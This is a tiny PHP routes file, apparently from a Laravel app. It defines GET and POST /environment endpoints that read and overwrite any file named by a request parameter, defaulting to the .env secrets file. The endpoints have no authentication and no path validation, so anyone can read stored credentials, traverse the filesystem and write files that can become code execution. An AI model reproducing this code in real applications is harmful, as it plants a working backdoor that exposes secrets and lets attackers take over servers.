<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

Route::get('/environment', function (Request $request) {
    return file_get_contents(base_path($request->get('env-name','.env')));
});

Route::post('/environment', function (Request $request) {
    file_put_contents(base_path($request->get('env-name','.env')), $request->value);
});
